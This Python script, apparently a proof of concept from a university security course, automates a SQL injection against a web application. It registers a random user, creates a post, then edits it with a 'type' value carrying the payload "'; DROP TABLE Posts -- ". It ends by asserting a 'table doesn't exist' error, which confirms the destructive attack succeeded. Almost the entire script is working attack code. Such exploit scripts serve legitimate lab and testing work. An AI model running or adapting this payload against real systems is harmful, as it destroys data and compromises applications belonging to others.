import requests, sys, os, random
from bs4 import BeautifulSoup

SERVER = sys.argv[1]
# SERVER = 'http://d39e092608f9769e2696bf07d987072b4b2dd1dc9bce5e0151910fc276ae.project.ssof.rnl.tecnico.ulisboa.pt/'

session = requests.session()

# Random user credentials 
user = str(random.randint(2**27, 2**28))
password = str(random.randint(2**27, 2**28))

# Registration of the user
params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/register', data=params)

# Login of the user
params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/login', data=params, cookies=session.cookies)

# Create a new post
params = {}
headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}
r = requests.get(SERVER + '/create_post', params=params, headers=headers, cookies=session.cookies)

params = {'content' : 'New Post', 'type' : 'Public'}
r = session.post(SERVER + '/create_post', data=params, cookies=session.cookies)

# Edit the newly created post
r = requests.get(SERVER, params={}, headers=headers, cookies=session.cookies)
soup = BeautifulSoup(r.text, 'html.parser')
created_post_id = int(soup.find_all('input')[0]['value'])

content = 'This is a SQL Injection'
payload = {
    'id': created_post_id,
    'content': content,
    'type': "Public" + "'; DROP TABLE Posts -- "
}
r = session.post(SERVER + '/edit_post', data=payload, cookies=session.cookies)

# Go back to the home page
r = session.get(SERVER)

bs = BeautifulSoup(r.text, 'html.parser')
print(bs.prettify())

# Check if error 1146 Table doesn't exist occurs
assert '1146' in r.text